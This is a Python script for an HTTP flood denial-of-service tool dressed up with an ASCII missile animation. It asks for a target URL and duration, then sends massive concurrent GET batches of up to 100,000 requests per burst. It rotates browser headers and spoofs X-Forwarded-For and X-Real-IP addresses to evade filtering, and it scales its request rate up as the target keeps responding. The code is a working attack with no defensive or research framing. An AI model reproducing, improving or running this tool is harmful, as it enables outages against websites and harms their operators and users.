import asyncio
import aiohttp
import random
import time
import os
import shutil

# Terminal size
TERMINAL_SIZE = shutil.get_terminal_size((80, 40))
TERMINAL_WIDTH = TERMINAL_SIZE.columns
TERMINAL_HEIGHT = TERMINAL_SIZE.lines - 2

# Clear terminal
def clear():
    print("\033[H\033[J", end="")

# Generate random real-looking IPv4
def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

# Countdown loader with random IPs
async def countdown_loader(seconds):
    for i in range(seconds, 0, -1):
        clear()
        print(f"SG - RELOADING | {i}s")
        for _ in range(5):
            print(random_ip())
        await asyncio.sleep(1)

# Small missile body
MISSILE_BODY = [
"  /\\  ",
" |=|  ",
" |=|  ",
" |=|  ",
" |=|  "
]

# Exhaust colors
EXHAUST_FRAMES = [
    "\033[31m ^^^ \033[0m",
    "\033[33m *** \033[0m",
    "\033[91m !!! \033[0m",
    "\033[93m ::: \033[0m"
]

# Maximum batch sizes for each missile type (optimized for Termux)
MISSILE_BASE_SIZES = {
    1: 2000,   # Light missile - high frequency
    2: 5000,   # Medium missile
    3: 10000,  # Heavy missile
    4: 20000,  # Super missile
    5: 50000   # Ultra missile - maximum power
}

# Global request counter and performance tracking
total_requests = 0
requests_lock = asyncio.Lock()
performance_factor = 1.0

# Adaptive batch sizing based on recent performance
async def get_dynamic_batch_size(missile_type):
    global performance_factor
    
    base_size = MISSILE_BASE_SIZES.get(missile_type, 1000)
    
    # Adjust based on performance factor (starts at 1.0)
    dynamic_size = int(base_size * performance_factor)
    
    # Cap sizes to prevent memory issues
    max_sizes = {
        1: 5000,
        2: 15000,
        3: 30000,
        4: 60000,
        5: 100000
    }
    
    return min(dynamic_size, max_sizes[missile_type])

class Missile:
    def __init__(self, speed=None):
        self.reset(speed)

    def reset(self, speed=None):
        if speed:
            self.speed = speed
        else:
            self.speed = random.choice([1, 2, 3, 4, 5])
        
        self.batch = MISSILE_BASE_SIZES.get(self.speed, 1000)
        self.x = TERMINAL_WIDTH // 2 - len(MISSILE_BODY[0]) // 2
        self.y = TERMINAL_HEIGHT
        self.active = False
        self.launch_delay = random.uniform(0.3, 1.5)  # Much faster launches
        self.exhaust = random.choice(EXHAUST_FRAMES)
        self.requests_sent = 0
        self.last_batch_time = 0

    def move(self):
        if self.active:
            self.y -= self.speed
            if self.y < -len(MISSILE_BODY):
                self.reset()
                self.active = False

# Draw missiles with dynamic batch sizes
def draw_missiles(missiles):
    global total_requests, performance_factor
    
    buffer = [""] * TERMINAL_HEIGHT
    
    # System info at top (simplified without psutil)
    buffer[0] = f"PERF: {performance_factor:.1f}x | TOTAL REQUESTS: {total_requests}"
    buffer[1] = "=" * TERMINAL_WIDTH
    
    for missile in missiles:
        if missile.active:
            for i, line in enumerate(MISSILE_BODY):
                pos = missile.y - len(MISSILE_BODY) + i + 2  # Offset for system info
                if 0 <= pos < TERMINAL_HEIGHT:
                    if i == 0:
                        buffer[pos] += " " * missile.x + line + f"  [T{missile.speed}:{missile.batch}]"
                    else:
                        buffer[pos] += " " * missile.x + line
            exhaust_pos = missile.y + 2  # Offset for system info
            if 0 <= exhaust_pos < TERMINAL_HEIGHT:
                buffer[exhaust_pos] += " " * missile.x + random.choice(EXHAUST_FRAMES)
    
    clear()
    print("\n".join(buffer))

# Minimal headers for bypass
def get_headers():
    headers_list = [
        {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        },
        {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection': 'keep-alive'
        },
        {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Accept': '*/*',
            'Connection': 'keep-alive'
        }
    ]
    return random.choice(headers_list)

# Send batch requests with maximum efficiency
async def send_requests(target, batch, missile=None):
    global total_requests, performance_factor
    
    connector = aiohttp.TCPConnector(limit=0, verify_ssl=False, use_dns_cache=True)
    timeout = aiohttp.ClientTimeout(total=10)  # Shorter timeout for faster cycles
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        for i in range(batch):
            try:
                headers = get_headers()
                # Add some variation to headers
                if i % 3 == 0:
                    headers['X-Forwarded-For'] = random_ip()
                elif i % 5 == 0:
                    headers['X-Real-IP'] = random_ip()
                
                task = session.get(
                    target, 
                    headers=headers,
                    allow_redirects=True, 
                    ssl=False,
                    skip_auto_headers=['Accept-Encoding']  # Reduce overhead
                )
                tasks.append(task)
            except Exception as e:
                continue
        
        try:
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            successful = sum(1 for r in responses if not isinstance(r, Exception))
            
            async with requests_lock:
                total_requests += successful
            
            if missile:
                missile.requests_sent += successful
            
            # Adaptive performance adjustment
            success_rate = successful / batch if batch > 0 else 0
            if success_rate > 0.8:
                # Increase performance factor if we're doing well
                performance_factor = min(performance_factor * 1.1, 3.0)
            elif success_rate < 0.3:
                # Decrease if we're struggling
                performance_factor = max(performance_factor * 0.9, 0.5)
            
            return successful
        except Exception as e:
            # Decrease performance factor on exception
            performance_factor = max(performance_factor * 0.8, 0.5)
            return 0

# Continuous attack functions for each missile type
async def send_continuous_requests(target, missile):
    global performance_factor
    
    missile.requests_sent = 0
    flight_time = (TERMINAL_HEIGHT + len(MISSILE_BODY)) / missile.speed * 0.05
    
    start_time = time.time()
    
    while time.time() - start_time < flight_time and missile.active:
        # Get dynamic batch size based on current performance
        missile.batch = int(MISSILE_BASE_SIZES[missile.speed] * performance_factor)
        
        # Send requests based on missile type with optimized intervals
        intervals = {
            1: 0.001,  # 1ms - high frequency
            2: 0.002,  # 2ms
            3: 0.003,  # 3ms
            4: 0.005,  # 5ms
            5: 0.008   # 8ms - larger batches
        }
        
        interval = intervals[missile.speed]
        batch_size = min(missile.batch, 10000)  # Cap single batch size
        
        batch_start = time.time()
        successful = await send_requests(target, batch_size, missile)
        
        # Adaptive timing
        batch_duration = time.time() - batch_start
        sleep_time = max(0.0001, interval - batch_duration)  # Minimum 0.1ms sleep
        await asyncio.sleep(sleep_time)

# Special attack modes - MAXIMUM POWER
async def ultra_super_missile(target, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        batch = 50000  # Massive batches
        asyncio.create_task(send_requests(target, batch))
        await asyncio.sleep(1)  # Very frequent

async def last_missile(target, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        batch = 20000  # Large frequent batches
        asyncio.create_task(send_requests(target, batch))
        await asyncio.sleep(0.05)  # Extremely frequent

async def supernova_missile(target, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        delay = random.uniform(1, 3)  # Very frequent supernovas
        await asyncio.sleep(delay)

        # Massive initial burst
        initial_batch = 100000
        asyncio.create_task(send_requests(target, initial_batch))

        # Continuous ultra-high frequency stream
        async def stream():
            t_end = time.time() + 5  # Longer stream
            while time.time() < t_end:
                asyncio.create_task(send_requests(target, 5000))
                await asyncio.sleep(0.0001)  # Ultra high frequency
        asyncio.create_task(stream())

# Main loop
async def main():
    global total_requests, performance_factor
    
    target = input("¿TARGZ > ")
    duration = int(input("¿DU > "))

    await countdown_loader(5)

    # Create missiles of all types
    missiles = [Missile(i+1) for i in range(5)]  # One of each type

    # Start special attack modes
    asyncio.create_task(ultra_super_missile(target, duration))
    asyncio.create_task(last_missile(target, duration))
    asyncio.create_task(supernova_missile(target, duration))

    start_time = time.time()
    last_launch_times = [0] * len(missiles)

    while time.time() - start_time < duration:
        now = time.time()
        for idx, missile in enumerate(missiles):
            if not missile.active and now - last_launch_times[idx] >= missile.launch_delay:
                missile.active = True
                last_launch_times[idx] = now
                
                # Update batch size based on current performance
                missile.batch = int(MISSILE_BASE_SIZES[missile.speed] * performance_factor)
                
                # All missiles use continuous attack
                asyncio.create_task(send_continuous_requests(target, missile))
            
            missile.move()
        
        draw_missiles(missiles)
        await asyncio.sleep(0.02)  # Very fast update for maximum performance

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        clear()
